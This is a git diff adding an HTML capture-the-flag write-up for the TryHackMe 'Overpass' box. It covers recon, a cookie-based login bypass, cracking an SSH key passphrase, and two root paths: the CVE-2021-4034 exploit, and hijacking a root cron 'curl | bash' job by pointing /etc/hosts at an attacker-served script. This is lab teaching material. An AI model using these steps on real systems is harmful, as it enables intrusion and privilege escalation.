@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Overpass CTF</title>
+  </head>
+  <body>
+
+    <h1>Overpass CTF</h1>
+
+    <h3>Tasks:</h3>
+
+    <ul>
+      <li>Hack into the machine and get the <strong>user.txt</strong> flag</li> 
+      <li>Escalate privileges and get the <strong>root.txt</strong> flag</li>
+    </ul>
+
+    <h3>Step 1 - Recon</h3>
+    <p>Since we're given an IP address of the target, let's use nmap to scan it and see if any ports are open:</p>
+
+    <code>nmap -sV 10.10.192.255 -v</code>
+
+    <br><br>
+
+    <p>And from the output, we can see that there are two ports open on the target machine. Port 22 (SSH) and 80 (HTTP):</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199543842-ef5db06d-bfb8-4c49-b94b-b6ec8292797d.png">
+
+    <br><br>
+
+    <p>Since we don't have any idea of a username or password, the best thing to do here is to check out the webpage, on port 80.</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199544761-64cfaf7b-8612-4d88-85f8-fa42d42f7e76.png">
+
+    <br><br>
+
+    <p>So the webpage is for a password manager. Well, we can obviously see that there is an <i>About Us</i> and a <i>Downloads</i> page, but perhaps there could be other pages as well.</p> 
+
+    <p>Before we check, let's see if the page source has anything of interest to offer.</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199545395-f5ea6101-e0fb-4fb6-bbff-03b07d96ee58.png">
+
+    <br><br>
+
+    <p>Aha. So this alleged <i>Military Grade Encryption</i> is probably not what it sounds like.</p> 
+
+    <p>Anyway, let's scan the website with gobuster and see if there are other pages of interest:</p>
+
+    <code>gobuster dir -u http://10.10.192.255 -w /usr/share/wordlists/dirb/common.txt</code>
+
+    <br><br>
+
+    <p>This reveals that there are a couple more pages, which we didn't know about. </p>
+
+    <p>However, there is only one page in particular that stands out as interesting, and that is the <strong>/admin</strong> page.</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199546875-051aecb3-4803-4ce2-ae56-46ddff3bf365.png">
+
+    <br><br>
+
+    <p>Let's check it out:</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199547839-e1a230db-06c5-4535-a803-0b7fccb399c2.png">
+
+    <br><br>
+
+    <p>Well, well, well. A login page. Let's try putting admin for both username and password:</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199548259-f85768dc-95c4-499d-adee-e8b54061b8d4.png">
+
+    <br><br>
+
+    <p>Hmm.. We could always try brute forcing the login with hydra, but let's first see if there's anything of interest, using the developer tools:</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199548648-14915b36-9727-4241-af26-eff045204385.png">
+
+    <br>
+
+    <p>So we have a JavaScript file for cookie and one for login. Alright, that might be something.</p>
+
+    <p>It doesn't seem like cookie.js is of much use, as it is just a long line of text, which might be auto-generated.</p>
+
+    <br>
+
+    <p>login.js on the other hand, has some interesting information to offer. It seems like it will set a cookie if the credentials are not incorrect.</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199549814-2f06f479-fddc-4cfb-8afa-337e6b9a21d1.png">
+
+    <br><br>
+
+    <p>Let's try that out for ourselves, in the console:</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199549975-d57c47db-05d6-488e-b714-7f290afa6e88.png">
+
+    <br><br>
+
+    <p>And then refresh the page..</p>
+
+    <p>Aaand, we're in. And apparently there's some real valuable information on the very first page!</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199550652-b23e8cd8-329f-455e-9631-c441705d626d.png">
+
+    <br>
+
+    <p>So, it seems like we have a potential username, if not two. But James seems like the lesser smart person here, so let's focus on him.</p>
+
+    <p>We have his RSA Private Key right here on the page, so let's copy that into a new file and call it <i>id_rsa</i>.</p>
+
+    <br>
+
+    <p>And then try to login using the RSA key, through SSH with username james:</p>
+
+    <code>ssh james@10.10.192.255 -i id_rsa</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199551799-411463f7-7d38-4eee-81ef-0f77fa220fe1.png">
+
+    <br>
+
+    <p>Hmm.. It wants a passphrase for the key file. Which we don't have.</p> 
+
+    <p>Let's try using ssh2john.py to see if we can get anything out of the RSA key:</p>
+
+    <code>/opt/john/ssh2john.py</code>
+
+    <br><br>
+
+    <p>This returns us a long string of text, that we can give to john and attempt to find the passphrase, by running it against a wordlist. I'll use the good old <i>rockyou.txt</i>:</p>
+
+    <p>But first, I'll save the output to a new file and call it <i>john_rsa</i>.</p>
+
+    <br>
+
+    <p>Now, let's give it a go with john:</p>
+
+    <code>john --wordlist=/usr/share/wordlists/rockyou.txt john_rsa</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199553339-4af8e119-4c0d-49b2-a7f0-8b6c577c3337.png">
+
+    <br>
+
+    <p>Well, that was easy. So the passphrase should be *james13*. Let's try it out:</p>
+
+    <code>ssh james@10.10.192.255 -i id_rsa</code> 
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199553845-2c1ebd9a-4b21-47a9-8280-5cddef48f86c.png">
+
+    <br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199553961-7cd3849f-c4e3-425a-9ebc-be190fc33470.png">
+
+    <br>
+
+    <p>There we go. We're in! Now, let's find a flag.</p>
+
+    <br>
+
+    <h2>User flag</h2>
+
+    <code>ls</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199554136-55d814d0-4a64-4bc4-a709-62597ba22a53.png">
+
+    <br>
+
+    <p>There we have our user.txt.</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/199554329-cfb9b7b8-3c7e-4e85-a0b1-0d9f05b060d5.png">
+
+    <br>
+
+    <p>Nice. Now, let's get the root flag.</p>
+
+    <br>
+
+    <h2>Root flag</h2>
+
+    <p>Now, to make life a little easy, let's try to get an enumeration tool, such as linpeas onto the target machine.</p>
+
+    <p><i>Note: linpeas can be installed by using the command</i> <code>sudo apt install peass</code>, <i>which will also install other tools alongside it. You can then type</i> <code>linpeas</code><i> into the terminal and you should be directed into the directory where linpeas.sh is.</i></p>
+
+    <br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200117080-91fe0198-cc44-4e3e-860a-af2a07ad925a.png">
+
+    <br>
+
+    <p>Now that we have it on our host machine, let's get it over to the target.</p>
+
+    <p>First, I'll open up a http server with python on my host machine, in the directory where linpeas.sh is:</p>
+
+    <code>python3 -m http.server 4444</code>
+
+    <br><br>
+
+    <p>And then, on the target machine, I'll use wget to download the linpeas.sh file. This will only work in a directory where our user has read+write access, so I'll use the /tmp directory:</p>
+
+    <code>wget [my-ip]:4444/usr/share/peass/linpeas/linpeas.sh</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200117504-4cfe9f90-7e10-47f9-902d-0cd80897bea3.png">
+
+    <br>
+
+    <p>Now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:</p>
+
+    <code>chmod +x linpeas.sh</code>
+
+    <br>
+
+    <p>And then run it:</p>
+
+    <code>./linpeas.sh</code>
+
+    <br><br>
+
+    <p>linpeas will show a lot of information. And a lot of it is not really of interest to us. However, it does show us a couple of interesting things, that can be potentially exploited.</p>
+
+    <p>A pretty certain exploit has been found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31).</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200117628-c4cac89d-d8c5-4545-be2a-e7ed1775990d.png">
+
+    <br>
+
+    <p>Further down, it tells us a download link from github which we technically could use wget a command to get, but it doesn't seem to be working very well on our target..</p>
+    <p>However, we can look it up on exploit-db and see what it's all about:</p>
+
+    <a href="https://www.exploit-db.com/exploits/50689">Exploit-Db - CVE-2021-4034</a>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200117740-99f56183-8f5b-4cc4-8416-26eeefbe4876.png">
+
+    <img src="https://user-images.githubusercontent.com/78546461/200117786-c036220c-7e5d-4792-b8d0-31f799167221.png">
+    
+    <br>
+
+    <p>Ah. So we can actually just create a couple of files in our tmp directory, based on the code from the website, and then run the code afterwards, using the commands shown.</p>
+
+    <p>Let's make the files:</p>
+
+    <code>nano evil-so.c</code>
+
+    <br><br>
+
+    <p>And we put the code from the page, where it says "##### evil-so.c #####", into the file. Then we save it and move on to the next one:</p>
+
+    <code>nano exploit.c</code>
+
+    <br><br>
+
+    <p>And we do the same thing here as well, copy-pasting the code, where it says "##### exploit.c #####".</p>
+
+    <p>Just to be sure, I make the files executable:</p>
+
+    <code>chmod +x evil-so.c</code>
+
+    <br>
+
+    <code>chmod +x exploit.c</code>
+
+    <br><br>
+
+    <p>Now, let's run the gcc commands, shown on the website:</p>
+
+    <code>gcc -shared -o evil.so -fPIC evil-so.c</code>
+
+    <br>
+
+    <code>gcc exploit.c -o exploit</code>
+
+    <br><br>
+
+    <p>And then run the file called "exploit"</p>
+
+    <code>./exploit</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200117961-943d8a39-07a6-4fa0-b192-ba641f7906ed.png">
+
+
+    <p>BOOM! We are root! Don't mind the error messages, the exploit will still work, as you can see.</p>
+
+    <br>
+
+    <p>Now, we don't have an interactive shell, but that can easily be solved with:</p>
+
+    <code>/bin/bash</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200118042-5b60aa5d-38f7-4951-9bfe-8e94fbbcacda.png">
+
+    <br>
+
+    <p>And just like stealing candy from a baby, there is nothing stopping us from going straight into the /root directory and getting our flag:</p>
+
+    <code>cd /root && ls -l</code>
+
+    <br>
+
+    <code>cat root.txt</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200057349-7a343073-7523-4303-8696-cb9f59729428.png">
+
+    <br><br>
+
+    <h1>Alternative way to get Root Flag</h1>
+
+    <h2>This is the most probable way, that TryHackMe actually intended us to use</h2>
+
+    <p>If we go back to the step where we had used linpeas to enumerate and then focus on a line further down, we can see that there's a cron job running every minute:</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200057999-667b11a6-b1b8-4eb7-bf0f-6435c53155d4.png">
+
+    <br>
+
+    <p>So from what we can see here, the command <code>root curl overpass.thm/downloads/src/buildscript.sh | bash</code> is running every minute.</p>
+
+    <p>This means that each minute, the command will pipe the script "buildscript.sh" into bash, with root privileges. And the script seems to be on a different server..</p>
+
+    <br>
+
+    <p>Hmmm... Wonder if we can do anything with that.. hehe..</p>
+
+    <p>If we take a look into the folder /etc/hosts, we'll actually find *overpass.thm* and the corresponding IP address.</p>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200118118-b837c5e7-38b0-43ec-a3cb-fea06f373482.png">
+
+    <br>
+
+    <p>And guess what.. the file is world-writable! So we can just edit it if we want.. Oh boy, this means trouble!</p>
+
+    <br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200118158-1fe3d3fa-eb9e-4251-9f86-08a37641c694.png">
+
+    <br>
+
+    <p>Let's edit it, to make a request to our IP address instead.</p>
+
+    <p>But first, we have to make the necessary directories and script, so that it actually has something to download.</p>
+
+    <br>
+
+
+    <p>So, on our host machine, we can go into the <code>/</code> directory, <code>cd /</code> and then use the commands:</p>
+
+    <code>sudo mkdir downloads/src -p</code>
+
+    <br>
+
+    <code>sudo nano buildscript.sh</code>
+
+    <br><br>
+
+    <p>And then we can write our script, which will be executed by the target, with root privileges. Let's not forget the <i>#!/bin/bash</i> at the top of our script:</p>
+
+    <code>
+      #!/bin/bash
+      <p></p>
+      sudo cp /root/root.txt /root.txt && chmod +r /root.txt james
+    </code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200118218-4a27d127-cfc8-4e04-b4bc-8cac32d530b8.png">
+
+    <br>
+
+    <p>This will first copy the root.txt file from the /root directory, into the / directory and then, it will change the file mode bits for the root.txt file, so that James also can read it.</p>
+
+    <br>
+
+    <p>Now, we change the IP for overpass.thm in the /etc/hosts file on the target, to our IP:</p>
+
+    <code>nano /etc/hosts</code>
+
+    <br><br>
+
+    <p>A cool little trick we can do, is to watch changes to a directory in real time. So we can actually see if something is happening on the target:</p>
+
+    <code>watch ls -l /</code>
+
+    <br><br>
+
+    <p>And then we open up a port, on port 80, on our host machine. This is where the curl command from the target (in the cronjob) will attempt to fetch the "buildscript.sh" from.</p>
+
+    <code>sudo python3 -m http.server 80</code>
+
+    <br><br>
+
+    <p>Now that we have the file, let's read it!</p>
+
+    <code>cat root.txt</code>
+
+    <br><br>
+
+    <img src="https://user-images.githubusercontent.com/78546461/200060519-49250209-8f08-4404-9512-1544f1171580.png">
+
+    <br><br>
+
+    <p>And that's it!</p>
+
+    <p>Two different ways of getting the flag.</p>
+
+    <p>We could also have used a reverse shell or gotten the flag in other ways, but for the sake of simplicity, I'll stop here.</p>
+
+    <p>However, feel free coming up with new ways of getting the root flag, by editing the <strong><i>buildscript.sh</i></strong> script in the /downloads/src directory, on your host machine. 😈</p>
+
+    <br>
+
+
+    <h4><i>Made by PatrickSkovgaard (GitHub)</i></h4>
+
+  </body>
+</html>
